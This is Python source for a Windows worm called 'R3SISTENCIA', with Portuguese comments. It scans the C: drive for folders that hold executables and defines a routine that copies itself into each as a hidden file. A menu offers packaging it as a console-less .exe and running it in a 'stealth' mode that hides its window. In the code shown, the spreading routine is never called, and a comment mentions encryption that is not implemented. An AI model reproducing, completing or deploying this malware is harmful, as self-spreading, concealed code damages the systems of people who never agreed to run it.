import os
import sys
import time
import threading
import shutil
import win32con
import win32gui
from os import system

ROOTDIR = r"C:\\"

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False
        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                try:
                    for f in os.listdir(directory_path):
                        if f.endswith(".exe"):
                            self.target_dir_list.append(directory_path)
                            break
                except PermissionError:
                    pass

        self.directories_found = True

    def spread(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            shutil.copyfile(self.own_path, destination)

    def execute_worm(self):
        # self.create_new_worm()
        # self.copy_existing_files()
        if not self.directories_found:
            self.find_directories()

        print(self.target_dir_list)

def banner_func():
    print("""
  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
 | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
 |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
 |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """)
        
def worm_menu():
    print(' --------------------------------- ')
    print('|      R 3 S I S T 3 N C I A      |')
    print(' --------------------------------- ')
    print('| [+] 1 => Launch Worm!           |')
    print('| [+] 2 => Make It Executable!    |')
    print('| [+] 3 => Run Worm in Stealth!   |')
    print('| [!] 0 => Exit!                  |')
    print(' --------------------------------- ')

if __name__ == "__main__":
    system("pip install pypiwin32 pyinstaller > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
    system("cls")

    banner_func()
    time.sleep(3)

    worm = Worm()

    opt = int
    while opt != 0:
        worm_menu()
        opt = int(input("Operation: "))
        time.sleep(3)
        match opt:
            case 1:
                print("[!] Running Worm!")
                print('[!] Press [Ctrl] + [C] to Stop!')
                worm.execute_worm()
            case 2:
                print("[+] Creating EXE of Worm!")
                print('[!] Press [Ctrl] + [C] to Stop!')
                time.sleep(2)

                os.system("pyinstaller resistencia-worm.py --onefile --noconsole")
                print("[!] resistencia-worm.exe Created")
            case 3:
                print("[!] Running Worm in Stealth Mode!")
                print('[!] Press [Ctrl] + [C] to Stop!')
                time.sleep(2)
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)

                worm.execute_worm()
            case 0:
                print("[!] Quitting...")
                time.sleep(1.5)
                break
            case _:
                print("[!] Invalid Option.")
                print("[!] Try again")